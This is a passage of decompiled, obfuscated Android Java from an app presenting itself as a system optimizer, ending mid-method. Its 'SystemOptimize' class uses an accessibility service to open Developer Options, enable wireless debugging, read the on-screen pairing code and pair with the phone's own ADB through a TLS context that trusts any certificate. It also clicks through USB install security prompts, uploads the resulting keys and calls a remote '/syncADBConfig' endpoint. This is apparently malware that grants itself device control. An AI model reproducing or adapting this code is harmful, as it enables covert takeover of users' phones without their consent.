package com.storm.safe.rock.service.modules.setup;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.nsd.NsdManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.account.C0287a0;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.util.StringUtil;
import io.github.muntashirakon.crypto.spake2.Spake2Context;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyManagementException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManager;
import kotlin.AbstractC0767a0;
import kotlin.Pair;
import kotlin.jvm.internal.Ref$IntRef;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import okhttp3.internal.http2.Http2Connection;
import okio.Segment;
import okio.internal.Buffer;
import org.bouncycastle.cert.CertIOException;
import org.conscrypt.Conscrypt;
import org.conscrypt.PSKKeyManager;
import org.json.HTTP;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0577hd;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0765ko;
import p000.AbstractC1117qo;
import p000.AbstractC1517zh;
import p000.C0393cw;
import p000.C0579hf;
import p000.C0763km;
import p000.C0931ny;
import p000.C1351vv;
import p000.C1452yc;
import p000.InterfaceC0117b0;
import p000.RunnableC0027ag;
import p000.RunnableC0029ai;
import p000.RunnableC1052p1;
import p000.b81;
import p000.bf1;
import p000.c41;
import p000.dh0;
import p000.e41;
import p000.f41;
import p000.g41;
import p000.g70;
import p000.gg0;
import p000.h10;
import p000.h40;
import p000.h41;
import p000.i41;
import p000.i70;
import p000.j41;
import p000.j70;
import p000.k41;
import p000.kg1;
import p000.kh1;
import p000.ki1;
import p000.l41;
import p000.ld0;
import p000.m21;
import p000.m41;
import p000.md0;
import p000.n41;
import p000.nb0;
import p000.p41;
import p000.t20;
import p000.t60;
import p000.tz0;
import p000.v00;
import p000.v10;
import p000.w00;
import p000.we1;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.setup.a2 */
/* loaded from: classes2.dex */
public final class C0360a2 {

    /* renamed from: f9 */
    public static final j41 f53810f9 = new j41(null);

    /* renamed from: g0 */
    public static volatile C0360a2 f53811g0;

    /* renamed from: g1 */
    public static volatile SSLContext f53812g1;

    /* renamed from: g2 */
    public static volatile PrivateKey f53813g2;

    /* renamed from: g3 */
    public static volatile X509Certificate f53814g3;

    /* renamed from: a0 */
    public volatile AccessibilityService f53815a0;

    /* renamed from: a1 */
    public final Context f53816a1;

    /* renamed from: a2 */
    public volatile ScheduledExecutorService f53817a2;

    /* renamed from: a3 */
    public final ConcurrentLinkedQueue f53818a3;

    /* renamed from: a4 */
    public final AtomicReference f53819a4;

    /* renamed from: a5 */
    public final AtomicReference f53820a5;

    /* renamed from: a6 */
    public final ReentrantLock f53821a6;

    /* renamed from: a7 */
    public final AtomicBoolean f53822a7;

    /* renamed from: a8 */
    public final AtomicBoolean f53823a8;

    /* renamed from: a9 */
    public final bf1 f53824a9;

    /* renamed from: b0 */
    public final gg0 f53825b0;

    /* renamed from: b1 */
    public final h40 f53826b1;

    /* renamed from: b2 */
    public final Handler f53827b2;

    /* renamed from: b3 */
    public C0358a0 f53828b3;

    /* renamed from: b4 */
    public w00 f53829b4;

    /* renamed from: b5 */
    public h10 f53830b5;

    /* renamed from: b6 */
    public boolean f53831b6;

    /* renamed from: b7 */
    public p41 f53832b7;

    /* renamed from: b8 */
    public int f53833b8;

    /* renamed from: b9 */
    public final int f53834b9;

    /* renamed from: c0 */
    public boolean f53835c0;

    /* renamed from: c1 */
    public boolean f53836c1;

    /* renamed from: c2 */
    public boolean f53837c2;

    /* renamed from: c3 */
    public final y90 f53838c3;

    /* renamed from: c4 */
    public String f53839c4;

    /* renamed from: c5 */
    public final AtomicBoolean f53840c5;

    /* renamed from: c6 */
    public final AtomicBoolean f53841c6;

    /* renamed from: c7 */
    public final ArrayList f53842c7;

    /* renamed from: c8 */
    public KeyPair f53843c8;

    /* renamed from: c9 */
    public X509Certificate f53844c9;

    /* renamed from: d0 */
    public volatile long f53845d0;

    /* renamed from: d1 */
    public long f53846d1;

    /* renamed from: d2 */
    public boolean f53847d2;

    /* renamed from: d3 */
    public final AtomicInteger f53848d3;

    /* renamed from: d4 */
    public volatile boolean f53849d4;

    /* renamed from: d5 */
    public final y90 f53850d5;

    /* renamed from: d6 */
    public final AtomicInteger f53851d6;

    /* renamed from: d7 */
    public volatile boolean f53852d7;

    /* renamed from: d8 */
    public final AtomicInteger f53853d8;

    /* renamed from: d9 */
    public final AtomicInteger f53854d9;

    /* renamed from: e0 */
    public final ReentrantLock f53855e0;

    /* renamed from: e1 */
    public final ReentrantLock f53856e1;

    /* renamed from: e2 */
    public final y90 f53857e2;

    /* renamed from: e3 */
    public volatile boolean f53858e3;

    /* renamed from: e4 */
    public boolean f53859e4;

    /* renamed from: e5 */
    public final C0931ny f53860e5;

    /* renamed from: e6 */
    public final int f53861e6;

    /* renamed from: e7 */
    public final int f53862e7;

    /* renamed from: e8 */
    public final int f53863e8;

    /* renamed from: e9 */
    public final int f53864e9;

    /* renamed from: f0 */
    public final int f53865f0;

    /* renamed from: f1 */
    public final int f53866f1;

    /* renamed from: f2 */
    public final int f53867f2;

    /* renamed from: f3 */
    public final int f53868f3;

    /* renamed from: f4 */
    public final int f53869f4;

    /* renamed from: f5 */
    public final int f53870f5;

    /* renamed from: f6 */
    public final byte[] f53871f6;

    /* renamed from: f7 */
    public volatile g41 f53872f7;

    /* renamed from: f8 */
    public final Object f53873f8;

    public C0360a2(AccessibilityService accessibilityService, Context context) {
        this.f53815a0 = accessibilityService;
        this.f53816a1 = context;
        ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        t60.m214694b5(scheduledExecutorServiceNewSingleThreadScheduledExecutor, "newSingleThreadScheduledExecutor()");
        this.f53817a2 = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
        this.f53818a3 = new ConcurrentLinkedQueue();
        this.f53819a4 = new AtomicReference(SystemOptimizeManager$PairState.f53759a0);
        this.f53820a5 = new AtomicReference(SystemOptimizeManager$DevOptState.UNKNOWN);
        this.f53821a6 = new ReentrantLock();
        this.f53822a7 = new AtomicBoolean(false);
        this.f53823a8 = new AtomicBoolean(false);
        this.f53824a9 = new bf1();
        this.f53825b0 = new gg0(this.f53815a0);
        this.f53826b1 = new h40(this.f53815a0);
        this.f53827b2 = new Handler(Looper.getMainLooper());
        this.f53834b9 = 3;
        this.f53838c3 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$adbConfigPrefs$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return this.f53767a0.f53816a1.getSharedPreferences("ADBConfig", 0);
            }
        });
        this.f53839c4 = m212018g5();
        this.f53840c5 = new AtomicBoolean(false);
        this.f53841c6 = new AtomicBoolean(false);
        this.f53842c7 = new ArrayList();
        new ReentrantLock();
        this.f53848d3 = new AtomicInteger(0);
        this.f53850d5 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$heartbeatExecutor$2
            @Override // p000.w00
            public final Object invoke() {
                return Executors.newSingleThreadScheduledExecutor();
            }
        });
        this.f53851d6 = new AtomicInteger(0);
        this.f53852d7 = true;
        this.f53853d8 = new AtomicInteger(0);
        this.f53854d9 = new AtomicInteger(0);
        this.f53855e0 = new ReentrantLock();
        this.f53856e1 = new ReentrantLock();
        this.f53857e2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$adbTaskExecutor$2
            @Override // p000.w00
            public final Object invoke() {
                return Executors.newFixedThreadPool(1);
            }
        });
        this.f53860e5 = new C0931ny(this, new Handler(Looper.getMainLooper()));
        this.f53861e6 = 1314410051;
        this.f53862e7 = 1313165391;
        this.f53863e8 = 1163154007;
        this.f53864e9 = 1163086915;
        this.f53865f0 = 1213486401;
        this.f53866f1 = 1397511251;
        this.f53867f2 = 1497451343;
        this.f53868f3 = 16777217;
        this.f53869f4 = Http2Connection.OKHTTP_CLIENT_WINDOW_SIZE;
        this.f53870f5 = 1048576;
        byte[] bytes = "host::\u0000".getBytes(AbstractC0577hd.f56650a0);
        t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
        this.f53871f6 = bytes;
        this.f53873f8 = new Object();
    }

    /* renamed from: a9 */
    public static AccessibilityNodeInfo m211990a9(AccessibilityNodeInfo accessibilityNodeInfo) {
        for (int i = 0; accessibilityNodeInfo != null && i < 10; i++) {
            if (accessibilityNodeInfo.isClickable()) {
                return accessibilityNodeInfo;
            }
            accessibilityNodeInfo = accessibilityNodeInfo.getParent();
        }
        return null;
    }

    /* renamed from: b0 */
    public static final void m211991b0(C0360a2 c0360a2) {
        String string;
        boolean z;
        boolean z2;
        try {
            t60.m214714d6("SystemOptimize", "G() 开始执行");
            if (!c0360a2.f53823a8.get()) {
                t60.m214714d6("SystemOptimize", "G() 设置 isRunning=true, isFinished=false");
                c0360a2.f53823a8.set(true);
                c0360a2.f53822a7.set(false);
            }
            if (!c0360a2.m212028a2()) {
                t60.m214714d6("SystemOptimize", "G() K()=false，不在开发者选项页面，退出");
                c0360a2.f53818a3.remove("pairInDevOption");
                return;
            }
            t60.m214714d6("SystemOptimize", "G() K()=true，在开发者选项页面");
            AccessibilityNodeInfo accessibilityNodeInfoM212048d6 = c0360a2.m212048d6(c0360a2.f53815a0.getRootInActiveWindow());
            if (accessibilityNodeInfoM212048d6 == null) {
                t60.m214704c5("SystemOptimize", "开发者选项窗口滚动视图查找失败,重置开发者选项窗口");
                c0360a2.f53818a3.remove("pairInDevOption");
                return;
            }
            t60.m214714d6("SystemOptimize", "G() 滚动视图查找成功");
            boolean zM213522c8 = kg1.m213522c8();
            boolean zM213521c7 = kg1.m213521c7();
            boolean zM213524d0 = kg1.m213524d0();
            boolean zM213519c5 = kg1.m213519c5();
            String str = Build.BRAND;
            t60.m214714d6("SystemOptimize", "G() 品牌判断: isVivo=" + zM213522c8 + ", isOppo=" + zM213521c7 + ", isXiaomi=" + zM213524d0 + ", isHuawei=" + zM213519c5 + ", isHonor=" + AbstractC0779a1.m213656a9(str, "honor") + ", isSamsung=" + AbstractC0779a1.m213656a9(str, "samsung"));
            String str2 = Build.MODEL;
            StringBuilder sb = new StringBuilder("G() Build.BRAND=");
            sb.append(str);
            sb.append(", Build.MODEL=");
            sb.append(str2);
            t60.m214714d6("SystemOptimize", sb.toString());
            if (zM213522c8) {
                t60.m214714d6("SystemOptimize", "G() 进入Vivo分支，调用J0()检查开发者选项总开关");
                if (c0360a2.m212027a1(accessibilityNodeInfoM212048d6)) {
                    t60.m214714d6("SystemOptimize", "G() Vivo J0()=true，开发者选项总开关已开启");
                } else {
                    t60.m214704c5("SystemOptimize", "G() Vivo J0()=false，开发者选项总开关开启失败");
                    t60.m214714d6("SystemOptimize", "G() 等待1秒让页面刷新...");
                    m212025k1(5);
                }
            } else {
                t60.m214714d6("SystemOptimize", "G() 非Vivo设备，跳过J0()检查");
            }
            AccessibilityNodeInfo accessibilityNodeInfoM212048d62 = c0360a2.m212048d6(c0360a2.f53815a0.getRootInActiveWindow());
            if (accessibilityNodeInfoM212048d62 != null) {
                accessibilityNodeInfoM212048d6 = accessibilityNodeInfoM212048d62;
            }
            t60.m214714d6("SystemOptimize", "G() 开始w0()滚动查找无线调试");
            AccessibilityNodeInfo accessibilityNodeInfoM212102l2 = c0360a2.m212102l2(accessibilityNodeInfoM212048d6);
            if (accessibilityNodeInfoM212102l2 == null) {
                t60.m214726f4("SystemOptimize", "G() w0()第一次返回null，等待1秒后重试");
                m212025k1(5);
                AccessibilityNodeInfo accessibilityNodeInfoM212048d63 = c0360a2.m212048d6(c0360a2.f53815a0.getRootInActiveWindow());
                if (accessibilityNodeInfoM212048d63 != null) {
                    accessibilityNodeInfoM212102l2 = c0360a2.m212102l2(accessibilityNodeInfoM212048d63);
                }
            }
            if (accessibilityNodeInfoM212102l2 == null) {
                t60.m214704c5("SystemOptimize", "G() w0()返回null，无线调试栏目查找失败");
                c0360a2.f53818a3.remove("pairInDevOption");
                return;
            }
            t60.m214714d6("SystemOptimize", "G() w0()成功，无线调试栏目: text=" + ((Object) accessibilityNodeInfoM212102l2.getText()) + ", class=" + ((Object) accessibilityNodeInfoM212102l2.getClassName()));
            AccessibilityNodeInfo accessibilityNodeInfoM211990a9 = m211990a9(accessibilityNodeInfoM212102l2);
            if (accessibilityNodeInfoM211990a9 == null) {
                t60.m214704c5("SystemOptimize", "G() R()返回null，无线调试可点击栏目查找失败");
                c0360a2.f53818a3.remove("pairInDevOption");
                return;
            }
            CharSequence className = accessibilityNodeInfoM211990a9.getClassName();
            t60.m214714d6("SystemOptimize", "G() R()成功，可点击节点: class=" + ((Object) className) + ", clickable=" + accessibilityNodeInfoM211990a9.isClickable());
            CharSequence text = accessibilityNodeInfoM212102l2.getText();
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            t60.m214714d6("SystemOptimize", "G() 检查节点文本: '" + string + "'");
            if (string.length() > 0) {
                y90 y90Var = AbstractC0361a3.f53874a0;
                List list = dh0.f55794e4;
                if (list == null || !list.isEmpty()) {
                    Iterator it = list.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            z = false;
                            z2 = false;
                            break;
                        } else {
                            z = false;
                            if (AbstractC0779a1.m213652a5(string, (String) it.next(), false)) {
                                z2 = true;
                                break;
                            }
                        }
                    }
                } else {
                    z2 = false;
                    z = false;
                }
                t60.m214714d6("SystemOptimize", "G() 是否是撤消USB调试授权节点: " + z2);
                if (z2) {
                    t60.m214714d6("SystemOptimize", "G() 调用Q()处理撤消USB调试授权节点");
                    if (c0360a2.m212034a8(accessibilityNodeInfoM211990a9)) {
                        t60.m214714d6("SystemOptimize", "G() Q()成功，依禁用ADB节点位置进入无线调试栏目");
                        c0360a2.f53818a3.remove("pairInDevOption");
                        return;
                    }
                }
            } else {
                z = false;
            }
            String str3 = Build.BRAND;
            t60.m214694b5(str3, "BRAND");
            String lowerCase = str3.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            boolean z3 = ((lowerCase.equals("xiaomi") || lowerCase.equals("redmi") || lowerCase.equals("poco") || lowerCase.equals("blackshark")) && Build.VERSION.SDK_INT <= 30) ? true : z;
            t60.m214714d6("SystemOptimize", "G() xiaomiNeedsWirelessDebugPreCheck=" + z3);
            if (z3) {
                t60.m214714d6("SystemOptimize", "G() 进入小米分支，调用P()勾选无线调试开关");
                if (c0360a2.m212033a7(accessibilityNodeInfoM211990a9)) {
                    t60.m214714d6("SystemOptimize", "G() P()成功，无线调试已勾选");
                } else {
                    t60.m214714d6("SystemOptimize", "G() P()失败");
                }
            } else {
                t60.m214714d6("SystemOptimize", "G() 非小米或不需要预勾选，跳过P()");
            }
            t60.m214714d6("SystemOptimize", "G() 点击前等待1秒");
            m212025k1(5);
            t60.m214714d6("SystemOptimize", "G() 即将点击进入无线调试栏目");
            if (accessibilityNodeInfoM211990a9.performAction(16)) {
                c0360a2.f53819a4.set(SystemOptimizeManager$PairState.f53760a1);
                t60.m214714d6("SystemOptimize", "G() 点击成功，进入无线调试栏目");
                m212025k1(10);
            } else {
                t60.m214704c5("SystemOptimize", "G() 点击失败");
            }
            c0360a2.f53818a3.remove("pairInDevOption");
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "G() pairInDevOption 异常", e);
        }
    }

    /* renamed from: b1 */
    public static final SSLContext m211992b1(C0360a2 c0360a2, File file, File file2) throws NoSuchAlgorithmException, KeyManagementException {
        PrivateKey privateKeyM212075i0;
        SSLContext sSLContext = f53812g1;
        if (sSLContext != null) {
            return sSLContext;
        }
        try {
            X509Certificate x509CertificateM212074h9 = c0360a2.m212074h9(file);
            if (x509CertificateM212074h9 != null && (privateKeyM212075i0 = c0360a2.m212075i0(file2)) != null) {
                t60.m214702c3("SystemOptimize", "私钥加载成功: " + privateKeyM212075i0.getAlgorithm() + ", 证书: " + x509CertificateM212074h9.getSubjectDN());
                f41 f41Var = new f41(privateKeyM212075i0, x509CertificateM212074h9);
                TrustManager[] trustManagerArr = {new m41(0)};
                SSLContext sSLContext2 = SSLContext.getInstance("TLSv1.3");
                sSLContext2.init(new KeyManager[]{f41Var}, trustManagerArr, new SecureRandom());
                f53812g1 = sSLContext2;
                t60.m214714d6("SystemOptimize", "SSLContext 创建并缓存成功");
                return sSLContext2;
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "创建 ADB TLS Context 失败", e);
            return null;
        }
    }

    /* renamed from: b2 */
    public static final byte[] m211993b2(RSAPublicKey rSAPublicKey, String str) {
        byte[] bArrEncode = C0393cw.encode(m212004e5(rSAPublicKey));
        byte[] bytes = AbstractC0003a2.m33b4(" ", str, "\u0000").getBytes(AbstractC0577hd.f56650a0);
        t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
        byte[] bArr = new byte[bArrEncode.length + bytes.length];
        System.arraycopy(bArrEncode, 0, bArr, 0, bArrEncode.length);
        System.arraycopy(bytes, 0, bArr, bArrEncode.length, bytes.length);
        return bArr;
    }

    /* renamed from: b3 */
    public static final void m211994b3(C0360a2 c0360a2) {
        try {
            t60.m214702c3("SystemOptimize", "pairInSecurityCenter 窗口匹配");
            AccessibilityNodeInfo rootInActiveWindow = c0360a2.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return;
            }
            y90 y90Var = AbstractC0361a3.f53874a0;
            AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow, dh0.f55788d8);
            if (accessibilityNodeInfoM212014f9 != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM211990a9 = m211990a9(accessibilityNodeInfoM212014f9);
                if (accessibilityNodeInfoM211990a9 != null) {
                    accessibilityNodeInfoM212014f9 = accessibilityNodeInfoM211990a9;
                }
                if (accessibilityNodeInfoM212014f9.isClickable() && accessibilityNodeInfoM212014f9.performAction(16)) {
                    t60.m214702c3("SystemOptimize", "USB安装设置窗口下一步按钮查找并点击完成");
                    List list = C0362a4.f53875a0;
                    C0362a4.m212113a8(c0360a2.f53815a0, 1500L);
                    c0360a2.f53818a3.remove("pairInSecurityCenter");
                    return;
                }
            }
            AccessibilityNodeInfo accessibilityNodeInfoM212014f92 = m212014f9(rootInActiveWindow, dh0.f55750a0);
            if (accessibilityNodeInfoM212014f92 != null) {
                t60.m214702c3("SystemOptimize", "USB安装设置窗口允许按钮查找完成");
                AccessibilityNodeInfo accessibilityNodeInfoM211990a92 = m211990a9(accessibilityNodeInfoM212014f92);
                if (accessibilityNodeInfoM211990a92 != null) {
                    accessibilityNodeInfoM212014f92 = accessibilityNodeInfoM211990a92;
                }
                if (accessibilityNodeInfoM212014f92.isClickable()) {
                    t60.m214702c3("SystemOptimize", "USB安装设置窗口允许按钮已可以点击");
                    if (accessibilityNodeInfoM212014f92.performAction(16)) {
                        t60.m214702c3("SystemOptimize", "USB安装设置窗口允许按钮点击完成");
                        List list2 = C0362a4.f53875a0;
                        C0362a4.m212113a8(c0360a2.f53815a0, 1500L);
                        int i = 0;
                        while (i < 20) {
                            try {
                                AccessibilityNodeInfo rootInActiveWindow2 = c0360a2.f53815a0.getRootInActiveWindow();
                                if (rootInActiveWindow2 == null) {
                                    return;
                                }
                                y90 y90Var2 = AbstractC0361a3.f53874a0;
                                if (m212014f9(rootInActiveWindow2, dh0.f55807f7) != null) {
                                    t60.m214702c3("SystemOptimize", "当前处于USB安全设置对话框");
                                    c0360a2.f53837c2 = true;
                                    c0360a2.m212094k4();
                                    return;
                                }
                                i++;
                                t60.m214702c3("SystemOptimize", "正在开启USB安全设置.... (第" + i + "次检查)");
                                List list3 = C0362a4.f53875a0;
                                C0362a4.m212113a8(c0360a2.f53815a0, 1500L);
                            } catch (Exception e) {
                                t60.m214705c6("SystemOptimize", "pairInSecurityCenter 循环检查异常", e);
                                return;
                            }
                        }
                    }
                }
            }
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "pairInSecurityCenter 异常", e2);
        }
    }

    /* renamed from: b4 */
    public static final void m211995b4(C0360a2 c0360a2) {
        AccessibilityNodeInfo rootInActiveWindow;
        SystemOptimizeManager$PairState systemOptimizeManager$PairState = SystemOptimizeManager$PairState.f53763a4;
        SystemOptimizeManager$PairState systemOptimizeManager$PairState2 = SystemOptimizeManager$PairState.f53761a2;
        try {
            if (c0360a2.f53819a4.get() == systemOptimizeManager$PairState2) {
                return;
            }
            c0360a2.f53819a4.set(SystemOptimizeManager$PairState.f53760a1);
            AccessibilityNodeInfo rootInActiveWindow2 = c0360a2.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow2 != null) {
                String str = Build.BRAND;
                t60.m214694b5(str, "BRAND");
                String lowerCase = str.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (lowerCase.equals("vivo") || lowerCase.equals("iqoo")) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow2.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_bar");
                    if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty() && ((AccessibilityNodeInfo) AbstractC0715je.m213290h7(listFindAccessibilityNodeInfosByViewId)).isClickable() && ((AccessibilityNodeInfo) AbstractC0715je.m213290h7(listFindAccessibilityNodeInfosByViewId)).performAction(16)) {
                        m212025k1(10);
                        c0360a2.m212068h2();
                    }
                } else {
                    c0360a2.m212033a7(rootInActiveWindow2);
                }
            }
            k41 k41VarM212098k8 = null;
            AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = null;
            for (int i = 0; i < 20 && (rootInActiveWindow = c0360a2.f53815a0.getRootInActiveWindow()) != null; i++) {
                y90 y90Var = AbstractC0361a3.f53874a0;
                accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow, dh0.f55790e0);
                if (accessibilityNodeInfoM212014f9 != null) {
                    break;
                }
                List list = C0362a4.f53875a0;
                C0362a4.m212113a8(c0360a2.f53815a0, 1500L);
                m212025k1(2);
            }
            if (accessibilityNodeInfoM212014f9 == null) {
                t60.m214704c5("SystemOptimize", "未找到[使用配对码配对设备]按钮");
                return;
            }
            m212025k1(3);
            AccessibilityNodeInfo accessibilityNodeInfoM211990a9 = m211990a9(accessibilityNodeInfoM212014f9);
            if (accessibilityNodeInfoM211990a9 != null) {
                accessibilityNodeInfoM212014f9 = accessibilityNodeInfoM211990a9;
            }
            if (!accessibilityNodeInfoM212014f9.performAction(16)) {
                t60.m214704c5("SystemOptimize", "点击[使用配对码配对设备]失败");
                return;
            }
            t60.m214702c3("SystemOptimize", "已点击[使用配对码配对设备]，等待配对码弹窗...");
            c0360a2.f53819a4.set(SystemOptimizeManager$PairState.f53762a3);
            long jCurrentTimeMillis = System.currentTimeMillis() + 10000;
            while (System.currentTimeMillis() < jCurrentTimeMillis) {
                m212025k1(5);
                k41VarM212098k8 = c0360a2.m212098k8();
                if (k41VarM212098k8 != null) {
                    break;
                }
            }
            if (k41VarM212098k8 == null) {
                t60.m214704c5("SystemOptimize", "等待配对码超时（10秒）");
                c0360a2.f53819a4.set(systemOptimizeManager$PairState);
                return;
            }
            t60.m214702c3("SystemOptimize", "配对码读取成功: port=" + k41VarM212098k8.f57455a1 + ", code=" + k41VarM212098k8.f57456a2);
            c0360a2.f53852d7 = false;
            if (c0360a2.m212054e2(k41VarM212098k8.f57455a1, k41VarM212098k8.f57456a2)) {
                t60.m214702c3("SystemOptimize", "配对成功");
                c0360a2.f53819a4.set(systemOptimizeManager$PairState2);
                try {
                    t60.m214714d6("SystemOptimize", "密钥上传结果: " + c0360a2.m212100l0());
                } catch (Exception e) {
                    t60.m214705c6("SystemOptimize", "上传密钥异常", e);
                }
                try {
                    m212002c8(c0360a2, "/syncADBConfig", c0360a2.m212041c6(true), 4);
                } catch (Exception e2) {
                    t60.m214702c3("SystemOptimize", "/syncADBConfig 调用失败: " + e2.getMessage());
                }
            } else {
                t60.m214702c3("SystemOptimize", "配对失败");
                c0360a2.f53819a4.set(systemOptimizeManager$PairState);
            }
            if (c0360a2.m212029a3()) {
                c0360a2.m212044d1();
            }
            c0360a2.f53818a3.remove("pairInWifiDebugWindow");
        } catch (Exception e3) {
            t60.m214705c6("SystemOptimize", "pairInWifiDebugWindow 异常", e3);
        }
    }

    /* renamed from: b5 */
    public static final i41 m211996b5(C0360a2 c0360a2, InputStream inputStream) throws IOException {
        byte[] bArr = new byte[24];
        int i = 0;
        int i2 = 0;
        while (i2 < 24) {
            int i3 = inputStream.read(bArr, i2, 24 - i2);
            if (i3 < 0) {
                throw new EOFException("EOF reading ADB header");
            }
            i2 += i3;
        }
        ByteBuffer byteBufferOrder = ByteBuffer.wrap(bArr).order(ByteOrder.LITTLE_ENDIAN);
        int i4 = byteBufferOrder.getInt();
        int i5 = byteBufferOrder.getInt();
        int i6 = byteBufferOrder.getInt();
        int i7 = byteBufferOrder.getInt();
        byteBufferOrder.getInt();
        byteBufferOrder.getInt();
        byte[] bArr2 = new byte[i7];
        while (i < i7) {
            int i8 = inputStream.read(bArr2, i, i7 - i);
            if (i8 < 0) {
                throw new EOFException("EOF reading ADB data");
            }
            i += i8;
        }
        return new i41(i4, bArr2, i5, i6);
    }

    /* renamed from: b6 */
    public static final byte[] m211997b6(C0360a2 c0360a2, byte[] bArr, File file) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException {
        try {
            PrivateKey privateKeyM212075i0 = c0360a2.m212075i0(file);
            if (privateKeyM212075i0 == null) {
                return null;
            }
            Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
            cipher.init(1, privateKeyM212075i0);
